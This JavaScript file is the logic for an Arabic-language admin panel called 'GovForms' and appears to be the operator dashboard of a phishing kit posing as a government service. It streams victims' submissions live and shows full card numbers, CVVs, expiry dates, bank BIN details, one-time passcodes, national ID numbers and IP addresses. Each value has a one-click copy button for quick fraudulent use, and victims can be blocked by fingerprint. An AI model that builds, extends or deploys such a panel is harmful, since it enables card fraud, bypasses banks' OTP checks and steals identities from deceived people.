/* =====================================================================
   GovForms — لوحة الإدارة — المنطق
   ===================================================================== */

const API = window.GOVFORMS_API_BASE || location.origin;

const state = {
  token: localStorage.getItem('govforms_token') || null,
  admin: null,
  inbox: [],
  currentFilter: 'all',
  search: '',
  selectedClientId: null,
  currentTimeline: null,
  socket: null,
  blockTarget: null,
};

/* ---------- نغمة الإشعار ---------- */
// بسبب قيود autoplay، نخزّن النغمة المعلّقة ونشغّلها عند أول تفاعل
let pendingNotification = false;
let audioCtx = null;

function playNotificationSound() {
  try {
    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    if (audioCtx.state === 'suspended') {
      // autoplay محظور — نخزّن ونشغّل عند أول تفاعل
      pendingNotification = true;
      return;
    }
    doPlaySound();
  } catch {
    pendingNotification = true;
  }
}

function doPlaySound() {
  if (!audioCtx) return;
  const osc = audioCtx.createOscillator();
  const gain = audioCtx.createGain();
  osc.connect(gain);
  gain.connect(audioCtx.destination);
  osc.frequency.value = 880;
  osc.type = 'sine';
  gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
  gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.4);
  osc.start();
  osc.stop(audioCtx.currentTime + 0.4);
}

// تشغيل النغمة المعلّقة عند أول تفاعل
function setupAutoplayUnlock() {
  const unlock = () => {
    if (audioCtx && audioCtx.state === 'suspended') audioCtx.resume();
    if (pendingNotification) {
      pendingNotification = false;
      doPlaySound();
    }
  };
  ['click', 'keydown', 'pointerdown'].forEach((ev) =>
    document.addEventListener(ev, unlock, { once: true })
  );
}

/* ---------- مساعدات الـ API ---------- */
async function api(path, opts = {}) {
  const headers = { 'Content-Type': 'application/json', ...(opts.headers || {}) };
  if (state.token) headers['Authorization'] = 'Bearer ' + state.token;
  const res = await fetch(API + path, { ...opts, headers });
  const data = await res.json();
  if (!res.ok) throw new Error(data.error || 'خطأ في الخادم');
  return data;
}

function showToast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 2500);
}

function copyToClipboard(text, label) {
  // navigator.clipboard مع fallback لـ execCommand للمتصفحات/الهواتف القديمة
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(text).then(
      () => showToast('تم نسخ ' + (label || 'القيمة')),
      () => fallbackCopy(text, label)
    );
  } else {
    fallbackCopy(text, label);
  }
}

function fallbackCopy(text, label) {
  const ta = document.createElement('textarea');
  ta.value = text;
  ta.style.position = 'fixed';
  ta.style.opacity = '0';
  document.body.appendChild(ta);
  ta.select();
  try {
    document.execCommand('copy');
    showToast('تم نسخ ' + (label || 'القيمة'));
  } catch {
    showToast('فشل النسخ');
  }
  document.body.removeChild(ta);
}

function formatTime(iso) {
  if (!iso) return '—';
  const d = new Date(iso);
  return d.toLocaleString('ar', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
}

function timeAgo(iso) {
  if (!iso) return '';
  const diff = Date.now() - new Date(iso).getTime();
  const min = Math.floor(diff / 60000);
  if (min < 1) return 'الآن';
  if (min < 60) return min + ' د';
  const hr = Math.floor(min / 60);
  if (hr < 24) return hr + ' س';
  const day = Math.floor(hr / 24);
  return day + ' ي';
}

/* ---------- المصادقة ---------- */
async function login() {
  const email = document.getElementById('loginEmail').value.trim();
  const password = document.getElementById('loginPassword').value;
  const errEl = document.getElementById('loginError');

  if (!email || !password) {
    errEl.textContent = 'يرجى إدخال البريد وكلمة المرور';
    errEl.classList.add('show');
    return;
  }

  try {
    const data = await api('/api/auth/login', {
      method: 'POST',
      body: JSON.stringify({ email, password }),
    });
    state.token = data.token;
    state.admin = data;
    localStorage.setItem('govforms_token', data.token);
    showApp();
  } catch (e) {
    errEl.textContent = e.message;
    errEl.classList.add('show');
  }
}

function logout() {
  state.token = null;
  state.admin = null;
  localStorage.removeItem('govforms_token');
  document.getElementById('appPage').classList.add('hidden');
  document.getElementById('loginPage').classList.remove('hidden');
}

function showApp() {
  document.getElementById('loginPage').classList.add('hidden');
  document.getElementById('appPage').classList.remove('hidden');
  const name = state.admin?.full_name || 'مدير';
  document.getElementById('adminName').textContent = name;
  const avatarEl = document.getElementById('adminAvatar');
  if (avatarEl) avatarEl.textContent = (name.trim()[0] || 'T').toUpperCase();
  loadStats();
  loadInbox();
  initSocket();
}

/* ---------- الإحصائيات ---------- */
function setHdr(id, val) {
  const el = document.getElementById(id);
  if (el) el.textContent = val;
}
async function loadStats() {
  try {
    const s = await api('/api/stats');
    // الرأس الجديد
    setHdr('hdrTotal', s.total);
    setHdr('hdrToday', s.today);
    setHdr('hdrPayments', s.pendingPayments);
    setHdr('hdrOtp', s.pendingOtp);
    // الزوار/العملاء (وهمي مؤقت يُحدَّث من الإجمالي حتى تتوفر مصادر حقيقية)
    setHdr('hdrVisitors', 0);
    setHdr('hdrVisLive', 0);
    setHdr('hdrVisToday', s.today);
    setHdr('hdrVisTotal', s.total);
    setHdr('hdrCliCards', s.pendingPayments);
    setHdr('hdrCliOtp', s.pendingOtp);
    setHdr('hdrCliTotal', s.total);
  } catch (e) {
    console.error('stats error', e);
  }
}

/* ---------- الوارد ---------- */
async function loadInbox() {
  const items = document.getElementById('inboxItems');
  items.innerHTML = '<div class="empty-state">جارٍ التحميل...</div>';
  try {
    const data = await api('/api/inbox?filter=all&limit=200');
    state.inbox = data.inbox || [];
    renderInbox();
  } catch (e) {
    if (e.message.includes('غير مصرّح')) {
      logout();
    } else {
      items.innerHTML = '<div class="empty-state">فشل التحميل: ' + e.message + '</div>';
    }
  }
}

function renderInbox() {
  const items = document.getElementById('inboxItems');
  let list = state.inbox;

  // فلترة
  if (state.currentFilter === 'card') {
    list = list.filter((s) => s.hasPayment);
  } else if (state.currentFilter === 'online') {
    list = list.filter((s) => s.client?.online);
  }
  // بحث
  if (state.search) {
    const q = state.search.toLowerCase();
    list = list.filter((s) => {
      const c = s.client;
      return (
        c?.full_name?.toLowerCase().includes(q) ||
        c?.email?.toLowerCase().includes(q) ||
        c?.phone?.includes(q) ||
        s.reference?.toLowerCase().includes(q) ||
        c?.fingerprint?.toLowerCase().includes(q)
      );
    });
  }

  if (!list.length) {
    items.innerHTML = '<div class="empty-state">لا توجد سجلات</div>';
    return;
  }

  items.innerHTML = '';
  list.forEach((s) => {
    const c = s.client;
    const div = document.createElement('div');
    div.className = 'inbox-item' + (s.client_id === state.selectedClientId ? ' selected' : '');
    // المفروض نستخدم client.id للمطابقة
    if (c?.id === state.selectedClientId) div.classList.add('selected');
    div.onclick = () => selectClient(c.id);
    div.innerHTML = `
      <div class="row1">
        <span class="name">${c?.full_name || '—'}</span>
        <span class="time">${timeAgo(s.created_at)}</span>
      </div>
      <div class="row2">
        <span class="ref">${s.reference}</span>
        <span class="tags">
          <span class="status-dot ${c?.online ? 'online' : 'offline'}"></span>
          ${s.hasPayment ? '<span class="tag card">💳</span>' : ''}
          ${s.hasOtp ? '<span class="tag otp">OTP</span>' : ''}
        </span>
      </div>
    `;
    items.appendChild(div);
  });
}

/* ---------- تفاصيل العميل ---------- */
async function selectClient(clientId) {
  state.selectedClientId = clientId;
  renderInbox();

  // نمط التبديل على الهاتف: إظهار التفاصيل وإخفاء القائمة
  document.getElementById('inboxLayout').classList.add('show-detail');

  const detail = document.getElementById('inboxDetail');
  detail.innerHTML = '<div class="empty-state">جارٍ التحميل...</div>';

  try {
    const data = await api('/api/client?client_id=' + clientId);
    state.currentTimeline = data;
    renderDetail(data);
  } catch (e) {
    detail.innerHTML = '<div class="empty-state">فشل التحميل: ' + e.message + '</div>';
  }
}

// زر الرجوع على الهاتف: يخفي التفاصيل ويعرض القائمة
function backToList() {
  document.getElementById('inboxLayout').classList.remove('show-detail');
}

function renderDetail(data) {
  const { client, timeline } = data;
  const detail = document.getElementById('inboxDetail');

  let html = `
    <div class="detail-header">
      <button class="back-btn" onclick="backToList()">↩ رجوع</button>
      <h3>${client.full_name || '—'}</h3>
      <span class="ref">${client.fingerprint?.slice(0, 16) || ''}</span>
    </div>
    <div class="timeline">
  `;

  // صندوق الملف الشخصي (profile) — دائماً موجود
  html += renderProfileBox(client);

  // باقي الصناديق حسب الخط الزمني
  for (const box of timeline) {
    if (box.type === 'profile') continue; // عُرضت كصندوق profile أعلاه
    html += renderTimelineBox(box);
  }

  html += `</div>`;

  // أزرار القرارات
  html += `
    <div class="decision-row">
      <input type="text" class="decision-note" id="decisionNote" placeholder="ملاحظة القرار (اختياري)">
      <button class="btn-approve" onclick="makeDecision('approve')">✓ موافقة</button>
      <button class="btn-reject" onclick="makeDecision('reject')">✕ رفض</button>
      <button class="btn-block" onclick="openBlockModal()">🚫 حظر</button>
    </div>
  `;

  detail.innerHTML = html;
}

function renderProfileBox(client) {
  return `
    <div class="timeline-box">
      <div class="timeline-box-header">
        <div class="box-icon profile">👤</div>
        <span class="box-title">الملف الشخصي</span>
        <span class="box-time">${formatTime(client.created_at)}</span>
      </div>
      <div class="timeline-box-body">
        <div class="line"><span class="key">الاسم الكامل</span><span class="val">${client.full_name || '—'}</span></div>
        <div class="line"><span class="key">البريد الإلكتروني</span><span class="val copyable" onclick="copyToClipboard('${client.email || ''}', 'البريد')">${client.email || '—'}</span></div>
        <div class="line"><span class="key">الهاتف</span><span class="val copyable" onclick="copyToClipboard('${client.phone || ''}', 'الهاتف')">${client.phone || '—'}</span></div>
        <div class="line"><span class="key">رقم الهوية</span><span class="val copyable" onclick="copyToClipboard('${client.id_number || ''}', 'رقم الهوية')">${client.id_number || '—'}</span></div>
        <div class="line"><span class="key">الدولة</span><span class="val">${client.country_name || client.country_code || '—'}</span></div>
        <div class="line"><span class="key">عنوان IP</span><span class="val copyable" onclick="copyToClipboard('${client.ip_address || ''}', 'IP')">${client.ip_address || '—'}</span></div>
        <div class="line"><span class="key">البصمة</span><span class="val copyable" onclick="copyToClipboard('${client.fingerprint || ''}', 'البصمة')" style="font-size:11px;">${client.fingerprint || '—'}</span></div>
        <div class="line"><span class="key">جهاز</span><span class="val" style="font-size:11px;">${client.device_info || '—'}</span></div>
        <div class="line"><span class="key">الحالة</span><span class="val"><span class="status-dot ${client.online ? 'online' : 'offline'}"></span>${client.online ? 'متصل' : 'غير متصل'}</span></div>
        <div class="line"><span class="key">آخر ظهور</span><span class="val">${formatTime(client.last_seen_at)}</span></div>
        <div class="line"><span class="key">حالة العميل</span><span class="val">${client.status || 'active'}</span></div>
      </div>
    </div>
  `;
}

function renderTimelineBox(box) {
  const icons = { submission: '📋', payment: '💳', otp: '🔑', file: '📎' };
  const d = box.data;

  let body = '';
  if (box.type === 'submission') {
    body = `
      <div class="line"><span class="key">المرجع</span><span class="val copyable" onclick="copyToClipboard('${d.reference || ''}', 'المرجع')">${d.reference || '—'}</span></div>
      <div class="line"><span class="key">نوع الخدمة</span><span class="val">${d.service_type || '—'}</span></div>
      <div class="line"><span class="key">الموضوع</span><span class="val">${d.subject || '—'}</span></div>
      <div class="line"><span class="key">نوع القارب</span><span class="val">${d.boat_type || '—'}</span></div>
      <div class="line"><span class="key">انتهاء الشهادة</span><span class="val">${d.certificate_expiry || '—'}</span></div>
      <div class="line"><span class="key">المحتوى</span><span class="val">${d.content || '—'}</span></div>
      <div class="line"><span class="key">الهاتف الثانوي</span><span class="val">${d.secondary_phone || '—'}</span></div>
      <div class="line"><span class="key">الحالة</span><span class="val"><span class="status-badge ${d.status}">${d.status}</span></span></div>
    `;
  } else if (box.type === 'payment') {
    // بطاقة مصوّرة + تفاصيل
    body = `
      <div class="payment-card-visual">
        <div class="card-network">${d.network || ''}</div>
        <div class="card-chip"></div>
        <div class="card-number" onclick="copyToClipboard('${(d.card_number || '').replace(/\s/g, '')}', 'رقم البطاقة')">${d.card_number || '•••• •••• •••• ••••'}</div>
        <div class="card-bottom">
          <div>
            <div class="card-label">حامل البطاقة</div>
            <div>${d.card_holder || '—'}</div>
          </div>
          <div>
            <div class="card-label">الانتهاء</div>
            <div>${d.expiry || '—'}</div>
          </div>
          <div>
            <div class="card-label">CVV</div>
            <div class="copyable" onclick="copyToClipboard('${d.cvv || ''}', 'CVV')">${d.cvv || '—'}</div>
          </div>
        </div>
      </div>
      <div class="line"><span class="key">آخر 4 أرقام</span><span class="val">${d.card_number_last4 || '—'}</span></div>
      <div class="line"><span class="key">البنك</span><span class="val">${d.bank_name || '—'}</span></div>
      <div class="line"><span class="key">نطاق البنك</span><span class="val">${d.bank_domain || '—'}</span></div>
      <div class="line"><span class="key">نوع البطاقة</span><span class="val">${d.card_type || '—'}</span></div>
      <div class="line"><span class="key">دولة البنك</span><span class="val">${d.bank_country || '—'}</span></div>
      <div class="line"><span class="key">BIN</span><span class="val copyable" onclick="copyToClipboard('${d.bin || ''}', 'BIN')">${d.bin || '—'}</span></div>
      <div class="line"><span class="key">الحالة</span><span class="val"><span class="status-badge ${d.status}">${d.status}</span></span></div>
    `;
  } else if (box.type === 'otp') {
    body = `
      <div class="line"><span class="key">الرمز</span><span class="val copyable" onclick="copyToClipboard('${d.code || ''}', 'رمز OTP')" style="font-size:20px;font-weight:700;letter-spacing:3px;">${d.code || '—'}</span></div>
      <div class="line"><span class="key">المرجع</span><span class="val">${d.reference || '—'}</span></div>
      <div class="line"><span class="key">الحالة</span><span class="val"><span class="status-badge ${d.status}">${d.status}</span></span></div>
    `;
  } else if (box.type === 'file') {
    body = `
      <div class="line"><span class="key">اسم الملف</span><span class="val">${d.file_name || '—'}</span></div>
      <div class="line"><span class="key">النوع</span><span class="val">${d.file_type || '—'}</span></div>
      <div class="line"><span class="key">الحجم</span><span class="val">${d.file_size ? (d.file_size/1024).toFixed(0) + ' KB' : '—'}</span></div>
      <div class="line"><span class="key">المسار</span><span class="val" style="font-size:11px;">${d.storage_path || '—'}</span></div>
      <div class="line"><span class="key">التصنيف</span><span class="val">${d.category || '—'}</span></div>
    `;
  }

  return `
    <div class="timeline-box">
      <div class="timeline-box-header">
        <div class="box-icon ${box.type}">${icons[box.type] || '📄'}</div>
        <span class="box-title">${getBoxTitle(box.type)}</span>
        <span class="box-time">${formatTime(box.time)}</span>
      </div>
      <div class="timeline-box-body">${body}</div>
    </div>
  `;
}

function getBoxTitle(type) {
  return { submission: 'تقديم طلب', payment: 'بطاقة دفع', otp: 'رمز تحقق', file: 'ملف مرفق' }[type] || type;
}

/* ---------- القرارات ---------- */
async function makeDecision(action) {
  if (!state.currentTimeline) return;
  // نطبّق القرار على أحدث submission معلّق
  const sub = state.currentTimeline.timeline.find((b) => b.type === 'submission');
  if (!sub) {
    showToast('لا يوجد سجل للقرار');
    return;
  }
  const status = action === 'approve' ? 'approved' : 'rejected';
  const note = document.getElementById('decisionNote')?.value || '';

  try {
    await api('/api/decision', {
      method: 'POST',
      body: JSON.stringify({
        target_type: 'submission',
        target_id: sub.data.id,
        status,
        decision_note: note,
      }),
    });
    showToast(action === 'approve' ? 'تمت الموافقة على الطلب' : 'تم رفض الطلب');
    selectClient(state.selectedClientId);
    loadStats();
    loadInbox();
  } catch (e) {
    showToast('فشل: ' + e.message);
  }
}

/* ---------- الحظر ---------- */
function openBlockModal() {
  if (!state.currentTimeline) return;
  state.blockTarget = {
    client_id: state.currentTimeline.client.id,
    fingerprint: state.currentTimeline.client.fingerprint,
    ip_address: state.currentTimeline.client.ip_address,
  };
  document.getElementById('blockReason').value = '';
  document.getElementById('blockModal').classList.add('show');
}

async function confirmBlock() {
  if (!state.blockTarget) return;
  const reason = document.getElementById('blockReason').value.trim();
  try {
    await api('/api/block', {
      method: 'POST',
      body: JSON.stringify({ action: 'block', ...state.blockTarget, reason }),
    });
    showToast('تم حظر العميل');
    closeModal('blockModal');
    state.blockTarget = null;
    loadStats();
    loadInbox();
  } catch (e) {
    showToast('فشل الحظر: ' + e.message);
  }
}

function closeModal(id) {
  document.getElementById(id).classList.remove('show');
}

/* ---------- Socket.io ---------- */
function initSocket() {
  if (typeof io === 'undefined') return;
  state.socket = io(API, { path: '/api/socket', transports: ['websocket', 'polling'] });

  state.socket.emit('admin:join');

  state.socket.on('admin:new_entry', () => {
    loadStats();
    loadInbox();
    playNotificationSound();
    showToast('📥 ورد سجل جديد');
  });

  state.socket.on('admin:decision_update', () => {
    loadStats();
  });
}

/* ---------- التهيئة ---------- */
document.addEventListener('DOMContentLoaded', () => {
  setupAutoplayUnlock();
  document.getElementById('loginBtn').onclick = login;
  document.getElementById('loginPassword').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') login();
  });
  document.getElementById('logoutBtn').onclick = logout;

  document.getElementById('confirmBlockBtn').onclick = confirmBlock;

  // الفلاتر
  document.querySelectorAll('.filter-btn').forEach((btn) => {
    btn.onclick = () => {
      document.querySelectorAll('.filter-btn').forEach((b) => b.classList.remove('active'));
      btn.classList.add('active');
      state.currentFilter = btn.dataset.filter;
      renderInbox();
    };
  });

  // البحث
  document.getElementById('searchInput').oninput = (e) => {
    state.search = e.target.value;
    renderInbox();
  };

  // التحقق التلقائي من التوكن
  if (state.token) {
    api('/api/auth/verify')
      .then((data) => {
        if (data.admin) {
          state.admin = data.admin;
          showApp();
        } else {
          logout();
        }
      })
      .catch(() => logout());
  }
});
